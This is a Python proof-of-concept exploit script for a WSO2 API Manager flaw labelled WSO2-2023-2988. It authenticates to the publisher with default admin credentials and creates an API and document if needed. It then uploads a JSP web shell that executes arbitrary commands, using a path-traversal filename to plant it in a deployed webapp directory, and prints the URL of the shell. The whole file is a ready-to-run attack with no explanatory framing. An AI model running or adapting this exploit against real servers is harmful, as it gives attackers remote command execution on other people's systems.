#!/usr/bin/env python

import sys
import argparse
import requests
import urllib3
import time
import hashlib
import logging

# Disable warnings about insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
PROXY_ADDRESS = '127.0.0.1'
PROXY_PORT = '8080'

def get_arguments():
  parser = argparse.ArgumentParser(description="WSO2-2023-2988 Proof of Concept")
  parser.add_argument('-t', '--target', required=True, help="WSO2 Target API Management (e.g.: https://localhost:9443)")
  parser.add_argument('-u', '--username', default='admin', help="Username for authentication (default: admin)")
  parser.add_argument('-p', '--password', default='admin', help="Password for authentication (default: admin)")
  parser.add_argument('-e', '--endpoint', default='api-products', help="API endpoint to exploit (default: api-products)")
  parser.add_argument('-v', '--version', default='v2', help="API version to exploit (default: v2)")
  parser.add_argument('-x', '--proxy', action='store_true', help=f"Enable proxy on {PROXY_ADDRESS}:{PROXY_PORT}")
  return parser.parse_args()

def initialize_session(proxy_enabled):
  proxies = {
    'http': f'http://{PROXY_ADDRESS}:{PROXY_PORT}',
    'https': f'http://{PROXY_ADDRESS}:{PROXY_PORT}'
  } if proxy_enabled else {}
  return requests.Session(), proxies

def handle_response(response, error_message):
  if not response.ok:
    logging.error(f"{error_message}. Status code: {response.status_code}")
    sys.exit(1)
  return response

def get_nonce_from_cookies(cookies):
  for cookie in cookies:
    if "sessionNonceCookie" in cookie:
      return cookie.split('sessionNonceCookie-')[1]
  logging.error("Failed to retrieve nonce for authentication.")
  sys.exit(1)

def authenticate(session, target, username, password, proxies):
  logging.info("Authenticating...")
  try:
    login_response = session.get(f'{target}/publisher/services/auth/login', verify=False, proxies=proxies)
    nonce = get_nonce_from_cookies(session.cookies.get_dict())
    auth_data = {
      'usernameUserInput': username,
      'username': username,
      'password': password,
      'sessionDataKey': nonce,
    }
    auth_response = session.post(f'{target}/commonauth', data=auth_data, verify=False, proxies=proxies)
    handle_response(auth_response, 'Authentication failed')
    logging.info("Authentication successful.")
  except requests.RequestException as e:
    logging.error(f"Authentication error: {e}")
    sys.exit(1)

def get_api_list(session, args, headers, proxies):
  logging.info("Retrieving list of available APIs...")
  try:
    response = session.get(f'{args.target}/api/am/publisher/{args.version}/{args.endpoint}?limit=10&offset=0', headers=headers, verify=False, proxies=proxies)
    api_list = response.json().get('list', [])
    if not api_list:
      api_list = [create_default_api(session, args, headers, proxies)]
      if args.endpoint == 'api-products':
        api_id = api_list[0]['id']
        api_list = [create_product_api(session, api_id, args, headers, proxies)]     
      
    return api_list
  except requests.RequestException as e:
    logging.error(f"Error retrieving API list: {e}")
    sys.exit(1)

def create_default_api(session, args, headers, proxies):
  logging.info("No APIs found. Creating a default API...")
  create_api_payload = {
    "name": "PizzaShackAPI",
    "description": "This is a simple API for Pizza Shack online pizza delivery store.",
    "context": "/pizzashack",
    "version": "1.0.0",
    "transport": ["http", "https"],
    "tags": ["pizza"],
    "policies": ["Unlimited"],
    "securityScheme": ["oauth2"],
    "visibility": "PUBLIC",
    "businessInformation": {
      "businessOwner": "Jane Roe",
      "businessOwnerEmail": "marketing@pizzashack.com",
      "technicalOwner": "John Doe",
      "technicalOwnerEmail": "architecture@pizzashack.com"
    },
    "endpointConfig": {
      "endpoint_type": "http",
      "sandbox_endpoints": {"url": f"{args.target}/am/sample/pizzashack/v1/api/"},
      "production_endpoints": {"url": f"{args.target}/am/sample/pizzashack/v1/api/"}
    },
    "operations": [
      {"target": "/menu", "verb": "GET", "throttlingPolicy": "Unlimited", "authType": "Application & Application User"}
    ]
  }
  response = session.post(f'{args.target}/api/am/publisher/{args.version}/apis', headers={**headers, 'Content-Type': 'application/json'}, json=create_api_payload, verify=False, proxies=proxies)
  handle_response(response, "Failed to create API")
  logging.info("Default API created successfully.")
  return response.json()

def create_product_api(session, api_id, args, headers, proxies):
  logging.info("Creating API Product...")
  
  create_product_api_payload ={
    "name":"test3",
    "context":"test3",
    "policies":["Unlimited"],
    "apis":[
      {
        "name":"",
        "apiId": api_id,
        "operations":[],
        "version":"1.0.0"
      }
    ],
    "transport":["http","https"]
  }
  response = session.post(f'{args.target}/api/am/publisher/{args.version}/api-products', headers={**headers, 'Content-Type': 'application/json'}, json=create_product_api_payload, verify=False, proxies=proxies)
  handle_response(response, "Failed to create API Product")
  logging.info("API Product created successfully.")
  return response.json()

def create_document(session, args, api_id, headers, proxies):
  doc_name = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
  create_document_data = {
    "name": f"document_{doc_name}",
    "type": "HOWTO",
    "summary": f"document_{doc_name}",
    "sourceType": "FILE",
    "visibility": "API_LEVEL",
  }
  response = session.post(f'{args.target}/api/am/publisher/{args.version}/{args.endpoint}/{api_id}/documents', headers=headers, json=create_document_data, verify=False, proxies=proxies)
  handle_response(response, f"Failed to create document in API {api_id}")
  logging.info(f"Document {doc_name} created successfully.")
  return response.json().get('documentId'), doc_name

def upload_file(session, args, api_id, doc_id, doc_name, headers, proxies):
  filename = f'test_{doc_name}.jsp'
  file_content = """
    <FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
      String s = null;
      try {
        Process p = Runtime.getRuntime().exec(cmd,null,null);
        BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
        while((s = sI.readLine()) != null) { output += s+"<br>"; }
      } catch(IOException e) { e.printStackTrace(); }
    }
    %>
    <pre><%= output %></pre>
  """
  file_payload = {'file': (f'../../../../repository/deployment/server/webapps/authenticationendpoint/{filename}', file_content, 'text/plain')}
  response = session.post(f'{args.target}/api/am/publisher/{args.version}/{args.endpoint}/{api_id}/documents/{doc_id}/content', headers=headers, files=file_payload, verify=False, proxies=proxies)
  handle_response(response, f"Failed to upload file to document {doc_id}")
  logging.info(f"File uploaded successfully. Access it at: {args.target}/authenticationendpoint/{filename}")

def main():
  args = get_arguments()
  session, proxies = initialize_session(args.proxy)
  authenticate(session, args.target, args.username, args.password, proxies)
  bearer_token = session.cookies.get('WSO2_AM_TOKEN_1_Default')
  headers = {'Authorization': f'Bearer {bearer_token}'}

  api_list = get_api_list(session, args, headers, proxies)
  for api in api_list:
    doc_id, doc_name = create_document(session, args, api['id'], headers, proxies)
    if doc_id:
      upload_file(session, args, api['id'], doc_id, doc_name, headers, proxies)

if __name__ == '__main__':
  main()
